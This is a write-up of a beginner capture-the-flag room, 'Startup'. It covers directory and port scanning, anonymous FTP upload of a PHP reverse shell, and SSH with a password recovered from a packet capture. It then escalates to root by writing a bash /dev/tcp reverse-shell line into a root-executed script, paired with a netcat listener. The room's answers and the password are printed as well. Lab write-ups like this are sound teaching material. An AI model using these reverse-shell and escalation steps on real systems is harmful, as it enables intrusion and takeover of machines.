# Startup |  Welcome to Spice Hut!
```
  CTF : "Startup"
  URL : https://tryhackme.com/room/startup
  Style: Unguided
  Difficulty : Easy / Beginner
```

Looks like a simple website.

To get started, lets run NMAP and GOBUSTER

```
gobuster dir -u "http://10.10.25.192" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster_full.txt
```
and NMAP
```
nmap -A 10.10.25.192 -oN ~/spicehut/nmap_A.txt -vv
```
GOBuster got a hit : ``<ip>/files/`` is accessible

We check the contents, and see that there is a FTP Folder and some files.

One of the Files:
```
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```
Just looking around, maybe the name `maya` is to be remembered for later.

While looking around in /files/ i see an FTP Folder, and confirm in NMAP that there is indeed a FTP server
```
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| FTP server status:
|      Connected to 10.14.12.121
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
```

I can Anonymous login to the FTP, lets see if we can upload it.

Uploaded a Reverse shell PHP with FTP, executed it and now logged in as _www-data_

## Question 1
I find recipe.txt on the "/" giving me the secret ingredient.

```
cat recipe.txt
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
```

## Question 2
I found a accessible pcapng file, here it seems that someone else made a reverse shell.

By using "Follow TCP Stream" it showed someone attempting to login using some password as lennie. Lets attempt this password

```
c4ntg3t3n0ughsp1c3
```

Seems i can login as Lennie! Instead of opening the Reverse shell again, i opted to just SSH into the machine using lennie as user.

``
lennie@<ip>
``

After this i executed /bin/bash to get a proper terminal.
## Question 3

First i tried running linPEAS and Linux Escalation Scripts respectively. I did not really get anything out of that...


I notice that in the `/home/lennie/scripts` folder there is some .sh file owned by root who calls ``/etc/print.sh`` (for no reason).

``/etc/print.sh`` is owned by lennie, so that allows me to make adjustments and they will be run BY root. By adjusting this file and adding a reverse shell it should be run as root and open a terminal as root.

```
#!/bin/bash
/bin/bash -l > /dev/tcp/10.14.12.121/4444 0<&1 2>&1
echo "Done!"
```

on my own Machine:

```
rlwrap nc -nvlp 4444
```

And now we wait, and within no time an terminal was opened.

```
whoami
root
```

This allows us to cat root.txt and complete the task!
